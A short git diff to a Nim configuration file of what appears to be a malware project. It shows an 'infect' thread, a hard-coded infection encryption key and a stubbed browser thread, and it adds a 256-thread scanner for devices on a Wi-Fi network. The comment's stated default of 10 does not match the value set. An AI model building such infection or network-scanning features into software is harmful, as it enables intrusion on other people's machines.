@@ -65,6 +65,18 @@ const USE_INFECT_THREAD*: bool = false
 ## from the executable
 const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"
 
+## connectedDevicesThread is used for getting all the connected
+## devices on a wifi network
+## DEFAULT: true
+const USE_CONNECTED_DEVICES_THREAD*: bool = true
+
+## the number of threads connectedDevicesThread will use
+## to check ips
+## lower value means lower cpu usage
+## higher value means lower time spent waiting
+## DEFAULT: 10
+const CONNECTED_DEVICES_THREAD_NO_OF_THREADS * : int = 256
+
 ## TODO: IMPLEMENT THE FOLLOWING LINES
 
 type browserThreadStart = enum
